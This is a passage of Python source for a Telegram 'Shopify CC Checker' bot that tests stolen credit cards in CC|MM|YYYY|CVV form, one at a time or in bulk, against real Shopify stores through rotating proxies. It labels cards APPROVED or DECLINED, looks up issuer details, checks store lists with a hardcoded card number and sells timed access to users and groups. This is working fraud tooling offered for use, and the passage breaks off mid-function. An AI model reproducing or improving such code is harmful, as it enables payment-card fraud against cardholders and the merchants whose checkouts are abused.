#         try:
#             global uploaded_ccs
            
#             if not message.document.file_name.endswith('.txt'):
#                 bot.reply_to(message, "❌ Only .txt files allowed!")
#                 return
            
#             # Read file directly to memory (NO DOWNLOAD)
#             file_content = read_telegram_file_to_memory(bot, message.document.file_id)
            
#             if not file_content:
#                 bot.reply_to(message, "❌ Could not read file!")
#                 return
            
#             # Extract CCs
#             ccs = extract_ccs_from_text(file_content)
            
#             if not ccs:
#                 bot.reply_to(message, "❌ No valid CCs found!\n\nFormat: <code>CC|MM|YYYY|CVV</code>", parse_mode='HTML')
#                 return
            
#             # Analyze patterns
#             stats = analyze_cc_patterns(ccs)
#             uploaded_ccs = ccs
            
#             # Show preview with BIN analysis
#             preview = "\n".join([f"✅ {cc.split('|')[0][:6]}****{cc.split('|')[0][-4:]}" for cc in ccs[:5]])
#             if len(ccs) > 5:
#                 preview += f"\n... and {len(ccs)-5} more"
            
#             response = f"""
# ┏━━━━━━━⍟
# ┃ <b>✅ FILE UPLOADED!</b>
# ┗━━━━━━━━━━━⊛

# [⌬] <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬</b>↣ {stats['total_ccs']}
# [⌬] <b>𝐔𝐧𝐢𝐪𝐮𝐞 𝐁𝐈𝐍𝐬</b>↣ {stats['unique_bins']}
# [⌬] <b>𝐌𝐚𝐱 𝐃𝐮𝐩𝐥𝐢𝐜𝐚𝐭𝐞</b>↣ {stats['max_duplicate']} ({stats['duplicate_percent']}%)

# <b>Preview:</b>
# {preview}

# ➡️ <b>Run:</b> <code>/msh</code> to start mass checking
# """
#             bot.send_message(message.chat.id, response, parse_mode='HTML')
#             print(f"✅ Loaded {len(ccs)} CCs from {message.document.file_name}")
        
#         except Exception as e:
#             bot.reply_to(message, f"❌ Error: {str(e)}")
#             logger.error(f"File upload error: {e}")
    
    


def test_proxy_quick_connect(proxy):
    """Quick test to see if proxy is reachable"""
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            proxy_dict = {'http': proxy_url, 'https': proxy_url}
            
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=5,
                verify=False
            )
            return response.status_code == 200
    except:
        pass
    return False

def format_message(cc, response, status, gateway, price, bin_info, user_id, full_name, time_taken, proxy_used=None):
    emoji = status_emoji.get(status, '⚠️')
    status_msg = status_text.get(status, '𝐄𝐫𝐫𝐨𝐫')
    
    cc_parts = cc.split('|')
    card_number = cc_parts[0]
    
    if bin_info:
        card_info = bin_info.get('brand', 'UNKNOWN') + ' ' + bin_info.get('type', 'UNKNOWN')
        issuer = bin_info.get('bank', 'UNKNOWN')
        country = bin_info.get('country_name', 'UNKNOWN')
        flag = bin_info.get('country_flag', '🇺🇳')
    else:
        card_info = 'UNKNOWN'
        issuer = 'UNKNOWN'
        country = 'UNKNOWN'
        flag = '🇺🇳'
    
    # Add proxy status
    if proxy_used:
        proxy_status = "Shining 🔆"
    else:
        proxy_status = "Dead 🚫"
    
    safe_name = full_name.replace("<", "").replace(">", "")  
    user_mention = f'<a href="tg://user?id={user_id}">{safe_name}</a>'
    
    message = f"""
┏━━━━━━━⍟
┃ <strong>{status_msg}</strong> {emoji}
┗━━━━━━━━━━━⊛

[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐚𝐫𝐝</strong>↣<code>{cc}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐫𝐚𝐧𝐝</strong>↣{card_info}
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐚𝐧𝐤</strong>↣{issuer}
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</strong>↣{country} {flag}
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</strong>↣ {user_mention}
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌Unknownop ꯭𖠌</a>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐓𝐢𝐦𝐞</strong>↣ {time_taken} <strong>𝐬𝐞𝐜𝐨𝐧𝐝𝐬</strong>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐲</strong>↣<strong>{proxy_status}</strong>
"""
    return message

# Format mass check message
def format_mass_message(cc, response, status, gateway, price, index, total, proxy_used=None):
    emoji = status_emoji.get(status, '⚠️')
    status_msg = status_text.get(status, '𝐄𝐫𝐫𝐨𝐫')
    
    # Add proxy status
    if proxy_used:
        proxy_status = "Shining 🔆"
    else:
        proxy_status = "Dead 🚫"
    
    # Extract card details (mask for security)
    cc_parts = cc.split('|')
    masked_cc = f"{cc_parts[0][:6]}******{cc_parts[0][-4:]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}"
    
    message = f"""
┏━━━━━━━⍟
┃ <strong>{status_msg}</strong> {emoji} <strong>•</strong> {index}/{total}
┗━━━━━━━━━━━⊛

[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐚𝐫𝐝</strong>↣<code>{masked_cc}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐲</strong>↣{proxy_status}
━━━━━━━━━━━━━━━━━━━
"""
    return message

def update_stats(status, mass_check=False):
    """Fixed: Proper stats tracking for ALL statuses"""
    global stats_data
    
    # Initialize stats_data if missing
    try:
        stats_data = load_json(STATS_FILE)
    except:
        stats_data = {
            'approved': 0, 'declined': 0, 'cooked': 0, 'error': 0,
            'mass_approved': 0, 'mass_declined': 0, 'mass_cooked': 0, 'mass_error': 0
        }
    
    # Count ALL statuses correctly
    if status == 'APPROVED' or status == 'APPROVED_OTP':
        key = 'approved'
        if mass_check:
            stats_data['mass_approved'] += 1
        else:
            stats_data[key] += 1
    elif status == 'COOKED':
        key = 'cooked'
        if mass_check:
            stats_data['mass_cooked'] += 1
        else:
            stats_data[key] += 1
    elif status in ['DECLINED', 'EXPIRED']:
        key = 'declined'
        if mass_check:
            stats_data['mass_declined'] += 1
        else:
            stats_data[key] += 1
    elif status == 'ERROR':
        key = 'error'
        if mass_check:
            stats_data['mass_error'] += 1
        else:
            stats_data[key] += 1
    
    # Save to file
    save_json(STATS_FILE, stats_data)
    
    # Console logging
    total = sum(stats_data.values())
    print(f"📊 STATS ({total}): {status} | Approved: {stats_data['approved'] + stats_data['mass_approved']}")


# Get sites based on price filter
def get_filtered_sites():
    global price_filter
    if not price_filter:
        return sites_data['sites']
    
    try:
        max_price = float(price_filter)
        return [site for site in sites_data['sites'] if float(site.get('price', 0)) <= max_price]
    except:
        return sites_data['sites']

# Command handlers
@bot.message_handler(commands=['start'])
@flood_control
@check_access
def send_welcome(message):
    help_text = """
<b>🔥 Welcome to Nova Shopify CC Checker Bot! 🔥</b>

<code>Available Commands:</code>
• /sh CC|MM|YYYY|CVV - Check a card
• /s CC|MM|YYYY|CVV - Short command for checking
• .sh CC|MM|YYYY|CVV - Alternative command
• .s CC|MM|YYYY|CVV - Alternative command
• cook CC|MM|YYYY|CVV - Alternative command

<code>Mass Check Commands:</code>
• /msh CCs - Check multiple cards (max 1000)
• .msh CCs - Alternative command
• hardcook CCs - Alternative command

━━━━━━━━━━━━━━━━━━━
<b>Bot By:</b> <a href="tg://user?id={DARKS_ID}">⏤‌‌Unknownop ꯭𖠌</a>
""".format(DARKS_ID=DARKS_ID)
    bot.reply_to(message, help_text, parse_mode='HTML')

@bot.message_handler(commands=['help'])
@flood_control
@check_access
def send_help(message):
    help_text = """
<b>🔥 Shopify CC Checker Bot - Help 🔥</b>

<code>Card Check Commands:</code>
• /sh CC|MM|YYYY|CVV - Check a card
• /s CC|MM|YYYY|CVV - Short command
• .sh CC|MM|YYYY|CVV - Alternative
• .s CC|MM|YYYY|CVV - Alternative
• cook CC|MM|YYYY|CVV - Alternative

<code>Mass Check Commands:</code>
• /msh CCs - Check multiple cards (max 15)
• .msh CCs - Alternative
• hardcook CCs - Alternative



━━━━━━━━━━━━━━━━━━━
<b>Bot By:</b> <a href="tg://user?id={DARKS_ID}">⏤‌‌unknownop ꯭𖠌</a>
""".format(DARKS_ID=DARKS_ID)
    
    bot.reply_to(message, help_text, parse_mode='HTML')

@bot.message_handler(commands=['owner'])
@flood_control
@check_access
def send_owner_help(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
        
    help_text = """
<b>🔥 Owner Commands 🔥</b>

<code>Site Management:</code>
• /addurls [urls] - Add multiple sites
• /addpro [proxy] - Add a proxy
• /clean - Clean invalid sites
• /cleanpro - Clean invalid proxies
• /rsite or /rmsite or /delsite - Remove single site
• /rmsites - Remove all sites
• /rmpro - Remove all proxies
• /viewsites - View all sites

<code>User Management:</code>
• /pro [userid] [days] - Approve user
• /rmuser [userid] - Remove User
• /grant [chatid] - Approve group
• /users - List approved users
• /groups - List approved groups

<code>Bot Management:</code>
• /stats - Show bot statistics
• /ping - Check bot response time
• /restart - Restart the bot
• /setamo - Set price filter for checking

━━━━━━━━━━━━━━━━━━━
<b>Bot By:</b> <a href="@Unknown_bolte">⏤‌‌Unknownop ꯭𖠌</a>
""".format(DARKS_ID=DARKS_ID)

    bot.reply_to(message, help_text, parse_mode='HTML')

@bot.message_handler(commands=['sh' , 's'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.sh') or m.text.startswith('.s') or m.text.lower().startswith('cook')))
@flood_control
@check_access
def handle_cc_check(message):
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_cc_check, args=(message,))
    thread.start()

def process_cc_check(message):
    # Check if command has CC or is a reply to a message with CC
    cc_text = None
    
    # Extract command text properly
    if message.text.startswith(('/sh', '/s', '.sh', '.s', 'cook', 'Cook')):
        parts = message.text.split(maxsplit=1)
        if len(parts) > 1:
            cc_text = parts[1]
    
    # If no CC in command text, check if it's a reply
    if not cc_text and message.reply_to_message:
        cc_text = message.reply_to_message.text
    
    if not cc_text:
        bot.reply_to(message, "Please provide a CC in format: /sh CC|MM|YYYY|CVV or reply to a message with CC.")
        return

    if proxies_data['proxies']:
        # Try to find a working proxy
        working_proxy = None
        for test_proxy in proxies_data['proxies'][:3]:  # Test first 3 proxies
            if test_proxy_quick_connect(test_proxy):
                working_proxy = test_proxy
                break
        
        proxy = working_proxy

    # Extract CC from text
    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "Invalid CC format. Please use CC|MM|YYYY|CVV format.")
        return
    
    # Send initial message
    processing_msg = bot.reply_to(message, "𝐂𝐨𝐨𝐤𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐎𝐫𝐝𝐞𝐫. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 🔥")
    
    # Get bin info from the extracted CC (not the original text)
    card_number = cc.split('|')[0]
    bin_info = get_bin_info(card_number)
    
    # Get random proxy
    proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
    
    # Get filtered sites based on price filter
    filtered_sites = get_filtered_sites()
    
    if not filtered_sites:
        bot.edit_message_text("No sites available. Please add sites first.", 
                             chat_id=message.chat.id, 
                             message_id=processing_msg.message_id)
        return
    
    # Start timer
    start_time = time.time()
    
    # Try multiple sites until we get a valid response
    max_retries = min(5, len(filtered_sites))  # Try up to 5 sites
    sites_tried = 0
    api_response = None
    site_obj = None
    
    # Shuffle sites to try different ones each time
    shuffled_sites = filtered_sites.copy()
    random.shuffle(shuffled_sites)
    
    for i, current_site_obj in enumerate(shuffled_sites[:max_retries]):
        sites_tried += 1
        site = current_site_obj['url']
        price = current_site_obj.get('price', '0.00')
        
        # Update status if trying multiple sites
        if i > 0:
            try:
                bot.edit_message_text(
                    f"𝐒𝐢𝐭𝐞 𝐃𝐞𝐚𝐝 🚫\n𝐋𝐞𝐭'𝐬 𝐂𝐨𝐨𝐤 𝐖𝐢𝐭𝐡 𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐒𝐢𝐭𝐞 🔥\n\n𝐓𝐫𝐲𝐢𝐧𝐢𝐠 𝐒𝐢𝐭𝐞 {i+1}/{max_retries}",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
            except:
                pass
        
        # Check sitecheck_site_shopify_direct
        api_response = check_site_shopify_direct(site, cc, proxy)
        
        # If we got a valid response, use this site
        if is_valid_response(api_response):
            site_obj = current_site_obj
            break
        
        # Small delay between site attempts
        time.sleep(1)
    
    # If no site worked, use the last one tried
    if not site_obj and shuffled_sites:
        site_obj = shuffled_sites[min(sites_tried-1, len(shuffled_sites)-1)]
        price = site_obj.get('price', '0.00')
    
    # Calculate time taken
    time_taken = round(time.time() - start_time, 2)
    
    # Process response
    response, status, gateway = process_response_shopify(api_response, price)
    
    # Update stats
    update_stats(status)
    
    # Get user full name properly
    first = message.from_user.first_name or ""
    last = message.from_user.last_name or ""
    full_name = f"{first} {last}".strip()
    
    # Format final message with clickable full name AND PROXY STATUS
    final_message = format_message(
        cc, response, status, gateway, price, bin_info,
        message.from_user.id, full_name, time_taken, proxy_used=proxy
    )
    
    # Edit the processing message with result
    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )

# @bot.callback_query_handler(func=lambda call: call.data == "file_type_proxy")
# def test_proxy_callback(call):
#     """When user clicks PROXY button"""
#     try:
#         bot.answer_callback_query(call.id, "✅ PROXY MODE SELECTED!", show_alert=True)
#         bot.edit_message_text(
#             "✅ <b>PROXY MODE ACTIVATED</b>\n\n"
#             "You can now upload proxy files\n"
#             "Format: host:port:username:password",
#             chat_id=call.message.chat.id,
#             message_id=call.message.message_id,
#             parse_mode='HTML'
#         )
#     except Exception as e:
#         logger.error(f"Proxy callback error: {e}")
#         bot.answer_callback_query(call.id, f"❌ Error: {str(e)}", show_alert=True)

# @bot.callback_query_handler(func=lambda call: call.data == "file_type_cc")
# def test_cc_callback(call):
#     """When user clicks CC button"""
#     try:
#         bot.answer_callback_query(call.id, "✅ CC MODE SELECTED!", show_alert=True)
#         bot.edit_message_text(
#             "✅ <b>CC MODE ACTIVATED</b>\n\n"
#             "You can now upload CC files\n"
#             "Format: CC|MM|YYYY|CVV",
#             chat_id=call.message.chat.id,
#             message_id=call.message.message_id,
#             parse_mode='HTML'
#         )
#     except Exception as e:
#         logger.error(f"CC callback error: {e}")
#         bot.answer_callback_query(call.id, f"❌ Error: {str(e)}", show_alert=True)
def validate_single_site(site_url, proxy=None):
    """
    Quick validation - just check if site is reachable
    Returns: (site_url, price, gateway, is_valid)
    """
    try:
        # Clean URL
        site_url = site_url.strip()
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        # Create session
        session = requests.Session()
        session.verify = False
        
        if proxy:
            proxy_url = f"http://{proxy}"
            session.proxies = {'http': proxy_url, 'https': proxy_url}
        
        # Try to get products (quick check)
        products_url = f"{site_url}/products.json?limit=10"
        r = session.get(products_url, timeout=10, verify=False)
        
        if r.status_code != 200:
            return (site_url, None, None, False)
        
        # Parse products
        data = r.json()
        products = data.get('products', [])
        
        if not products:
            return (site_url, None, None, False)
        
        # Find cheapest product
        min_price = float('inf')
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    try:
                        price = float(v.get('price', 0))
                        if 0 < price < min_price:
                            min_price = price
                    except:
                        pass
        
        if min_price == float('inf'):
            return (site_url, None, None, False)
        
        # ✅ VALID SITE
        return (site_url, f"{min_price:.2f}", "Shopify Payments", True)
        
    except requests.Timeout:
        return (site_url, None, None, False)
    except Exception as e:
        return (site_url, None, None, False)


@bot.callback_query_handler(func=lambda call: call.data.startswith('set_price_'))
def handle_price_callback(call):
    """Handle price filter buttons: set_price_5, set_price_10, etc."""
    global price_filter
    
    try:
        if call.data == "set_price_cancel":
            bot.answer_callback_query(call.id, "Cancelled", show_alert=False)
            bot.edit_message_text(
                "Price filter setting cancelled.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            return
        
        if call.data == "set_price_none":
            price_filter = None
            settings_data['price_filter'] = None
            save_json(SETTINGS_FILE, settings_data)
            
            bot.answer_callback_query(call.id, "✅ Filter removed", show_alert=False)
            bot.edit_message_text(
                f"✅ Price filter removed!\n\n"
                f"All {len(sites_data['sites'])} sites will be used.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            return
        
        # Extract price: set_price_5 → 5
        price_value = call.data.replace('set_price_', '')
        
        try:
            price_filter = float(price_value)
            settings_data['price_filter'] = price_filter
            save_json(SETTINGS_FILE, settings_data)
            
            # Count filtered sites
            filtered_sites = [s for s in sites_data['sites'] 
                            if float(s.get('price', 0)) <= price_filter]
            
            bot.answer_callback_query(call.id, f"✅ Filter set to ${price_filter}", show_alert=False)
            bot.edit_message_text(
                f"✅ Price filter set to <b>BELOW {price_filter}$</b>\n\n"
                f"Available sites: {len(filtered_sites)}/{len(sites_data['sites'])}\n\n"
                f"Only sites with price ≤ {price_filter}$ will be used.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='HTML'
            )
        except ValueError:
            bot.answer_callback_query(call.id, "❌ Invalid price!", show_alert=True)
    
    except Exception as e:
        logger.error(f"Price callback error: {e}")
        bot.answer_callback_query(call.id, f"❌ Error: {str(e)}", show_alert=True)

# OWNER COMMANDS
@bot.message_handler(commands=['pro'])
def handle_approve_user(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /pro <user_id> <days>")
            return
        
        user_id = parts[1]
        days = int(parts[2])
        
        # Calculate expiry date
        expiry_date = datetime.now() + timedelta(days=days)
        
        # Add user to approved list
        users_data[user_id] = {
            'approved_by': message.from_user.id,
            'approved_date': datetime.now().isoformat(),
            'expiry': expiry_date.isoformat(),
            'days': days
        }
        
        save_json(USERS_FILE, users_data)
        
        # Try to send notification to user
        try:
            bot.send_message(
                user_id,
                f"🎉 <b>Access Granted!</b>\n\n"
                f"You have been approved to use this bot for {days} days.\n"
                f"Your access will expire on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"Enjoy cooking! 🔥",
                parse_mode='HTML'
            )
        except:
            pass
        
        bot.reply_to(message, f"✅ User {user_id} approved for {days} days. Expiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['grant'])
def handle_approve_group(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /grant <chat_id>")
            return
        
        chat_id = parts[1]
        
        # Add group to approved list
        groups_data[chat_id] = {
            'approved_by': message.from_user.id,
            'approved_date': datetime.now().isoformat(),
            'title': "Unknown Group"
        }
        
        # Try to get group info
        try:
            chat = bot.get_chat(chat_id)
            groups_data[chat_id]['title'] = chat.title
        except:
            pass
        
        save_json(GROUPS_FILE, groups_data)
        
        # Send welcome message to group
        try:
            welcome_msg = """
┏━━━━━━━⍟
┃ <b> 𝐆𝐫𝐨𝐮𝐩 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! 🔥</b>
┗━━━━━━━━━━━⊛

🎉 <b>This group has been granted access to the CC Checker Bot!</b>

<b>Available Commands:</b>
• /sh CC|MM|YYYY|CVV - Check single card
• /msh - Mass check multiple cards
• /help - Show all commands

<b>Rules:</b>
• No spam commands
• Use responsibly
• Respect flood controls

<b>Happy Cooking! 🍳</b>

[<a href="https://t.me/Nova_bot_update">⌬</a>] <b>Bot By:</b> <a href="tg://user?id={DARKS_ID}">⏤‌‌Unknownop ꯭𖠌</a>
"""
            bot.send_message(chat_id, welcome_msg, parse_mode='HTML')
        except Exception as e:
            bot.reply_to(message, f"✅ Group {chat_id} approved, but could not send welcome message: {str(e)}")
            return
        
        bot.reply_to(message, f"✅ Group {chat_id} approved and welcome message sent!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['users'])
def handle_list_users(message):
    if not is_owner(message.from_user.id):
        return
    
    if not users_data:
        bot.reply_to(message, "No approved users found.")
        return
    
    users_list = "<b>👥 Approved Users:</b>\n\n"
    
    # Iterate with error handling to prevent crashes
    for user_id, data in users_data.items():
        try:
            # Handle missing or invalid expiry
            expiry_str = data.get('expiry')
            status = "✅ Active"
            days_left_str = "Unknown"
            
            if expiry_str:
                try:
                    expiry_date = datetime.fromisoformat(expiry_str)
                    days_left = (expiry_date - datetime.now()).days
                    if days_left < 0:
                        status = "❌ Expired"
                    days_left_str = f"{days_left} days"
                except ValueError:
                    days_left_str = "Invalid Date"
            else:
                status = "🔥 Lifetime"
                days_left_str = "∞"

            users_list += f"🆔 <code>{user_id}</code>\n"
            users_list += f"📅 Time Left: {days_left_str}\n"
            users_list += f"🔰 Status: {status}\n"
            users_list += "━━━━━━━━━━━━━━━━━━━\n"
            
        except Exception as e:
            # If one user fails, just log it and continue to the next
            print(f"Error listing user {user_id}: {e}")
            continue
    
    # Split message if it's too long for Telegram
    if len(users_list) > 4000:
        for x in range(0, len(users_list), 4000):
            bot.reply_to(message, users_list[x:x+4000], parse_mode='HTML')
    else:
        bot.reply_to(message, users_list, parse_mode='HTML')

@bot.message_handler(commands=['rmuser', 'ban'])
def handle_remove_user(message):
    if not is_owner(message.from_user.id):
        return

    try:
        # Usage: /rmuser 123456789
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/rmuser user_id</code>", parse_mode='HTML')
            return

        target_id = parts[1].strip()
        
        if target_id in users_data:
            del users_data[target_id]
            save_json(USERS_FILE, users_data)
            bot.reply_to(message, f"✅ <b>Success!</b>\nUser <code>{target_id}</code> has been banned/removed.", parse_mode='HTML')
        else:
            bot.reply_to(message, f"❌ <b>Error:</b> User <code>{target_id}</code> not found in database.", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
        
@bot.message_handler(commands=['rsite', 'rmsite', 'delsite'])
def handle_remove_site(message):
    if not is_owner(message.from_user.id):
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/rsite https://badsite.com</code>", parse_mode='HTML')
            return

        # Get the input and clean it (remove https://, http://, and extra paths)
        raw_input = parts[1].strip().lower()
        clean_target = raw_input.replace('https://', '').replace('http://', '').split('/')[0]

        original_count = len(sites_data['sites'])
        new_sites = []
        removed_count = 0

        # Filter: Keep sites that DO NOT match the target
        for site in sites_data['sites']:
            site_url = site.get('url', '').lower()
            if clean_target in site_url:
                removed_count += 1
            else:
                new_sites.append(site)
        
        # Save Update
        if removed_count > 0:
            sites_data['sites'] = new_sites
            save_json(SITES_FILE, sites_data)
            bot.reply_to(message, f"✅ <b>Deleted {removed_count} sites</b> matching:\n<code>{clean_target}</code>", parse_mode='HTML')
        else:
            bot.reply_to(message, f"⚠️ <b>Not Found:</b> No sites matched <code>{clean_target}</code>", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['debug'])
def debug_data(message):
    if message.from_user.id not in OWNER_ID:
        return
    
    # SAFE - no raw dump, just counts
    sites_count = len(sites_data.get('sites', [])) if isinstance(sites_data, dict) else len(sites_data) if sites_data else 0
    proxies_count = len(proxies_data.get('proxies', [])) if isinstance(proxies_data, dict) else len(proxies_data) if proxies_data else 0
    
    sites_preview = str(sites_data)[:200] + "..." if len(str(sites_data)) > 200 else str(sites_data)
    proxies_preview = str(proxies_data)[:200] + "..." if len(str(proxies_data)) > 200 else str(proxies_data)
    
    msg = (
        f"**Sites:** `{sites_count}`\n"
        f"**Proxies:** `{proxies_count}`\n\n"
        f"**Sites structure:**\n```{sites_preview}```\n\n"
        f"**Proxies structure:**\n```{proxies_preview}```"
    )
    bot.reply_to(message, msg, parse_mode="Markdown")


@bot.message_handler(commands=['addurls'])
def handle_addurls(message):
    """Add sites from TXT file - ROBUST VERSION"""
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only")
        return
    
    bot.reply_to(
        message,
        "📋 **Send .txt file with sites**\n\n"
        "One URL per line - I'll validate each one",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, process_addurls_file)

def process_addurls_file(message):
    """Process uploaded sites file with ROBUST Validation (Checks for Captcha/Token)"""
    try:
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Send a **.txt** file only")
            return
        
        status_msg = bot.reply_to(message, "📥 Downloading file...")
        
        # Download file
        file_info = bot.get_file(message.document.file_id)
        file_data = bot.download_file(file_info.file_path)
        content = file_data.decode('utf-8', errors='ignore')
        
        # Extract URLs
        lines = [line.strip() for line in content.split('\n') if line.strip()]
        lines = list(set(lines))  # Remove duplicates
        
        if not lines:
            bot.edit_message_text("❌ No URLs found", message.chat.id, status_msg.message_id)
            return
        
        bot.edit_message_text(f"🔍 Deep Validating **{len(lines)}** sites (Checking for Captcha)...\n⏳ Starting...", 
                            message.chat.id, status_msg.message_id, parse_mode="Markdown")
        
        added = 0
        skipped = 0
        captcha_count = 0
        total = len(lines)
        test_cc = "5242430428405662|03|28|323"  # Random test CC
        
        for idx, site_url in enumerate(lines, 1):
            try:
                # Clean URL
                site_url = site_url.strip()
                if not site_url.startswith(('http://', 'https://')):
                    site_url = f"https://{site_url}"
                site_url = site_url.rstrip('/')
                
                # 1. Simple Check First (Fast)
                if not validate_shopify_site(site_url):
                    skipped += 1
                    continue

                # 2. DEEP CHECK (Slow but prevents Captcha sites)
                # We try to reach the gateway. If we hit Captcha, we skip.
                proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
                
                # Perform a dry-run check
                response = check_site_shopify_direct(site_url, test_cc, proxy)
                
                is_valid = False
                gateway_name = "Shopify Payments"
                price = "0.00"

                # Check the response logic
                if isinstance(response, dict):
    # If we got a response at all, and it's not a connection error, consider it valid
                    if response.get('status') in ['APPROVED', 'DECLINED', 'ERROR']:
                        is_valid = True
                    else:
                        is_valid = False
                        captcha_count += 1
                
                # Add if Valid
                if is_valid:
                    # Check duplicate
                    if not any(s['url'] == site_url for s in sites_data['sites']):
                        sites_data['sites'].append({
                            'url': site_url,
                            'name': site_url.replace('https://', '').replace('http://', ''),
                            'price': price,
                            'gateway': gateway_name
                        })
                        added += 1
                    else:
                        skipped += 1
                else:
                    skipped += 1
                
                # Update progress every 5 sites
                if idx % 5 == 0 or idx == total:
                    bot.edit_message_text(
                        f"🔍 **Deep Validation Progress**\n"
                        f"Checked: {idx}/{total}\n"
                        f"✅ Added: {added}\n"
                        f"⛔ Captcha/Bad: {captcha_count}\n"
                        f"⚠️ Skipped: {skipped - captcha_count}",
                        message.chat.id, status_msg.message_id,
                        parse_mode="Markdown"
                    )
                
                time.sleep(1) # Slight delay to be safe

            except Exception:
                skipped += 1
                continue
        
        # Save and final report
        save_json(SITES_FILE, sites_data)
        
        final_text = (
            f"✅ **FILTERING COMPLETE!**\n\n"
            f"➕ Added: **{added}** (Clean Sites)\n"
            f"⛔ Blocked: **{captcha_count}** (Captcha/No Token)\n"
            f"📦 Total in DB: **{len(sites_data['sites'])}**"
        )
        
        bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        
def validate_shopify_site(site_url, timeout=10):
    """Simple Shopify validation - NO CARD CHECKING"""
    try:
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        r = requests.get(
            f"{site_url}/products.json?limit=5",
            timeout=timeout,
            verify=False
        )
        
        if r.status_code != 200:
            return False
        
        data = r.json()
        products = data.get('products', [])
        
        # Must have available products
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    return True
        
        return False
        
    except:
        return False

def get_site_price(site_url, timeout=10):
    """Get cheapest price from site"""
    try:
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        r = requests.get(
            f"{site_url}/products.json?limit=50",
            timeout=timeout,
            verify=False
        )
        
        if r.status_code != 200:
            return 0.00
        
        data = r.json()
        products = data.get('products', [])
        
        prices = []
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    try:
                        price = float(v.get('price', 0))
                        if price > 0:
                            prices.append(price)
                    except:
                        pass
        
        return min(prices) if prices else 0.00
        
    except:
        return 0.00

def validate_shopify_site_debug(site_url, timeout=10):
    """DEBUG VERSION - shows why sites fail"""
    try:
